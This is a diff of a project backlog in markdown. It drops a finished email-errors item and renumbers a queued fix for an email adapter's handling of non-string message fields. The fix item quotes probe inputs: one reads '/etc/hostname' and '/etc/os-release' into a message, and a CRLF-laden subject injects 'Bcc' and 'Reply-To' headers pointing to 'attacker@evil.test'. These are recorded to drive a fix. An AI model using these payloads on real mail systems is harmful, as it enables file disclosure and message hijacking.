@@ -18,18 +18,7 @@ In the order approved.
      - Test-first, as a bug fix.
    - **Why:** a misconfigured `url` puts the SMTP password into whatever logs the error at boot: `toJSON()` of a `BaseError` that wraps it, or a logger that serializes an error's own fields, as `@enardo/logger` does.
    - **From:** the `critic`'s second run on the spec of `feature/email/send-errors` (2026-10-20); queued first by the user at its checkpoint 1 (2026-10-20).
-2. **`feature/email/send-errors`**
-   - **What:** an error type in `@enardo/email` for a failed send, extending `BaseError` (a dependency on `@enardo/errors` only), which adapters throw in place of their driver's errors, with the driver's error as `cause`. The README states what `send` rejects with.
-     - The spec decides whether a retryable failure is told apart from a permanent one, and probes what the cause carries into a serialized error.
-     - Since `refactor/email/contract-docs`, `send` rejects when the relay refuses any recipient, although the others may have received the message. The spec decides whether the error names the refused recipients, so that a caller can retry those only.
-     - nodemailer 10.1.0's errors keep the shape of 6.10.1's: a plain `Error`, with the same `message`, `code` and `command` for a refused connection (`ESOCKET`, `CONN`), a host that does not resolve (`EDNS`, `CONN`), a `535` on `AUTH` (`EAUTH`, `AUTH PLAIN`) and a missing password (`EAUTH`, `API`). 10.1.0 adds an own field `originalCode` (`ECONNREFUSED`, `ENOTFOUND`) on the socket and DNS errors (probed by the review of `chore/email-nodemailer/nodemailer-10`, 2026-10-14, and again).
-     - Since `fix/email-nodemailer/contract-compliance`, `@enardo/email-nodemailer` throws three errors of its own: `InvalidEmailSenderOptionsError`, `InvalidEmailMessageError` and `EmailRecipientsRefusedError`. They are interim: the contract's errors replace them, or absorb them. The user asked at that branch's checkpoint 1 (2026-10-14) that their replacement be recorded here.
-     - That adapter rejects with nodemailer's own error (`EENVELOPE`, `command: "RCPT TO"`) when the relay refuses every recipient, and with `EmailRecipientsRefusedError` when it refuses some: the contract's error makes them one.
-     - nodemailer's errors carry the addresses the server echoed, in `message`, `response`, `rejected`, and the `recipient` of each of `rejectedErrors`: a `cause` keeps them in a serialized error (probed by the spec of `fix/email-nodemailer/contract-compliance`, 2026-10-14).
-     - Test-first, as public API of an `@enardo/*` package.
-   - **Why:** the contract says nothing of what `send` rejects with, and the adapter lets nodemailer's own `Error` through (`code: "ESOCKET"`, `"EDNS"`, `command: "CONN"`, probed on 2026-10-14). A caller that retries must know the driver's codes, the technology the port hides. The native error also reaches the HTTP client: with the SMTP server unreachable, the unprotected `POST /resend-verification-email` answers `getaddrinfo ENOTFOUND smtp.internal.corp.test` (probed through identity's handler and `CommandHandler` on 2026-10-14). This item closes the email path only: `@enardo/cqrs` turns the message of any native error into the client's error code. `@enardo/database` and `@enardo/uow-repository` already give their adapters contract errors.
-   - **From:** the architectural review of `@enardo/email` (2026-10-14); queued by the user (2026-10-14).
-3. **`fix/email-nodemailer/non-string-content`**
+2. **`fix/email-nodemailer/non-string-content`**
    - **What:** `@enardo/email-nodemailer` stops passing a `subject`, `text` or `html` that is not a string to nodemailer as it is.
      - nodemailer reads an object body as content to resolve: `{ path }` reads a file into the message, `{ href }` fetches a URL. Through the adapter, `html: { path: "/etc/hostname" }` and `text: { path: "/etc/os-release" }` put those files into the message (probed by the first review of `fix/email-nodemailer/contract-compliance`, 2026-10-14, and again).
      - nodemailer writes an object header value with `prepared: true` as raw text, for every header but those it formats (`FORMATTED_HEADERS`), and `Subject` is not one of them. Through the adapter, `subject: { prepared: true, value: "Hi\r\nBcc: attacker@evil.test\r\nReply-To: attacker@evil.test\r\n…" }` puts a `Bcc` and a `Reply-To` header into the message, and a body of the attacker's; the envelope does not change (probed by the second review of `fix/email-nodemailer/contract-compliance`, 2026-10-15, and again).
@@ -38,7 +27,7 @@ In the order approved.
      - Since `feature/email/send-errors`, `InvalidEmailMessageError` and its `InvalidEmailMessageDetails` are `@enardo/email`'s: refusing a `subject`, `text` or `html` that is not a string adds a field and a reason to the contract, a minor of `@enardo/email`.
    - **Why:** a value the types refuse reads a file into the message, or writes raw headers (`Bcc`, `Reply-To`), through the adapter.
    - **From:** the first and second reviews of `fix/email-nodemailer/contract-compliance` (2026-10-14 and 2026-10-15); queued by the user at its checkpoint 2 (2026-10-15).
-4. **`chore/repo/evaluate-critic`**
+3. **`chore/repo/evaluate-critic`**
    - **When:** once `docs/critic-runs.md` logs five L specs. Until then, the next item goes first.
    - **What:** count the `critic`'s runs by trigger, and remove each trigger none of whose runs changed a decision; a trigger that had no run goes to the user. The critic goes when no trigger is left. The text-only count goes to the user with it.
    - **Why:** the critic guards against a drift seen twice, both times on an L spec of the workflow (ADR 0007), and a rule that is only ever added grew the workflow before (ADR 0005).
